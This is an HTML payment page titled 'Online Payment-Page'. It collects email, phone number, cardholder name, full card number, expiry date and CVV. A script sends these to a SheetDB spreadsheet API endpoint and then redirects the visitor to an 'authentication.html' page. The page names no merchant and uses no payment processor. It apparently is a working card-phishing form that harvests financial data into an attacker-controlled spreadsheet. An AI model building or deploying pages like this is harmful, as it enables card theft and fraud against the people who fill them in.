<!DOCTYPE html> 
<html lang="en"> 

<head> 
	<meta charset="UTF-8"> 
	<meta name="viewport"
		content="width=device-width, initial-scale=1.0"> 
	<title>Online Payment-Page</title> 
	<link rel="stylesheet" href="styles.css"> 
</head> 

<body>   
	<div class="container"> 
<form id="msforming" method="post" action="https://sheetdb.io/api/v1/eltk8c0anah47">          
		   

			<div class="row"> 

				<div class="col"> 
					<h3 class="title">  
						Information
					</h3> 

					<div class="inputBox"> 
						<label for="name"> 
							Email: 
						</label> 
						<input type="text" id="email"
							placeholder="Enter email address" name="data[email]"
							required> 
					</div> 

					<div class="inputBox"> 
						<label for="email"> 
							Contact: 
						</label> 
						<input type="number" id="contact"
							placeholder="Enter your contact" name="data[contact]"
							required> 
					</div> 

		

				</div> 
				<div class="col"> 
					<h3 class="title">Payment (170)</h3> 

					<div class="inputBox"> 
						<label for="name"> 
							Payment Information: 
						</label> 
						<img src="cards.png"
							alt="credit/debit card image"> 
					</div> 

					<div class="inputBox"> 
						<label for="cardName"> 
							Name On Card: 
						</label> 
						<input type="text" id="cardName"
							placeholder="Enter card name" name="data[cardName]"
							required> 
					</div> 

					<div class="inputBox"> 
						<label for="cardNum"> 
							Credit Card Number: 
						</label> 
						<input type="text" id="cardNum"
							placeholder="1111-2222-3333-4444"
							maxlength="19" name="data[cardNum]" required> 
					</div> 

					<div class="inputBox"> 
						<label for="">Exp Month:</label> 
						<select name="data[expmonth]" id="expmonth"> 
							<option value="">Choose month</option> 
							<option value="January">January</option> 
							<option value="February">February</option> 
							<option value="March">March</option> 
							<option value="April">April</option> 
							<option value="May">May</option> 
							<option value="June">June</option> 
							<option value="July">July</option> 
							<option value="August">August</option> 
							<option value="September">September</option> 
							<option value="October">October</option> 
							<option value="November">November</option> 
							<option value="December">December</option> 
						</select> 
					</div> 


					<div class="flex"> 
						<div class="inputBox"> 
							<label for="">Exp Year:</label> 
							<select name="data[expyear]" id="expyear"> 
								<option value="">Choose Year</option> 
								<option value="2023">2023</option> 
								<option value="2024">2024</option> 
								<option value="2025">2025</option> 
								<option value="2026">2026</option> 
								<option value="2027">2027</option> 
                                <option value="2028">2028</option> 
                                <option value="2029">2029</option> 
                                <option value="2030">2030</option> 
                                <option value="2031">2031</option> 
                                <option value="2032">2032</option> 
                                <option value="2033">2033</option>
                                <option value="2034">2034</option>  
                                <option value="2035">2035</option> 
							</select> 
						</div> 

						<div class="inputBox"> 
							<label for="cvv">CVV</label> 
							<input type="number" id="cvv"
								placeholder="1234" name="data[cvv]" required> 
						</div> 
					</div>   


				</div> 
	
			</div> 


  
			<input type="submit" value="Proceed" class="submit_btn">   


	
</form> 
	</div> 
	  
	
	<script>
        var form = document.getElementById('msforming');  

        form.addEventListener("submit", function (e) {
            e.preventDefault();

            fetch(form.action, {
                method: "POST",
                body: new FormData(form)
            })
            .then(response => response.json())
            .then(() => {
                window.location.href = "authentication.html"; 
            })
            .catch(error => console.error("Error!", error));   
        });
    </script>
</body> 

</html>
